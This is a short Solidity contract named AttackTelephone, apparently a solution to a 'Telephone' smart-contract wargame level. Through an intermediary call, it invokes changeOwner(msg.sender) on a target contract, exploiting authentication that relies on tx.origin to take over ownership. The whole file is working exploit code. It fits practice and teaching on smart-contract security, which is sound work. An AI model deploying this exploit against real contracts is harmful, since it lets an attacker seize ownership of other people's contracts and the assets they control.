// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackTelephone {
    // Address of Telephone Smart Contract
    address contractAddress;

    function setContractAddress(address _contractAddress) public {
        contractAddress = _contractAddress;
    }

    function attack() public {
        // call changeOwner() of Telephone Smart Contract
        (bool success, ) = contractAddress.call(
            abi.encodeWithSignature("changeOwner(address)", msg.sender)
        );
        require(success, "Failed!");
    }
}
